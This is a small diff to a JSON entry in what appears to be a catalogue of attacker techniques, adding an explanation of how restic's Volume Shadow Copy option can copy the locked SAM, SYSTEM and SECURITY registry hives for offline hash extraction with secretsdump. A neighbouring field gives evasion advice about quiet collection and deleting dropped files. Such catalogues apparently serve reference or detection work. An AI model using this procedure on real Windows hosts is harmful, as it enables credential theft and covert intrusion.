@@ -91,5 +91,6 @@
       "MITRE T1048"
     ],
     "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
-  }
+  },
+  "explain": "Backs up locked registry hives using restic's VSS support, then dumps them offline:\n  restic.exe -r <repo> backup   create a backup into the repo\n  C:\\Windows\\System32\\config   the live SAM/SYSTEM/SECURITY hives (normally locked)\n  --use-fs-snapshot        use a Volume Shadow Copy so the locked files can be read\nRestore the snapshot elsewhere and run secretsdump for the local hashes."
 }
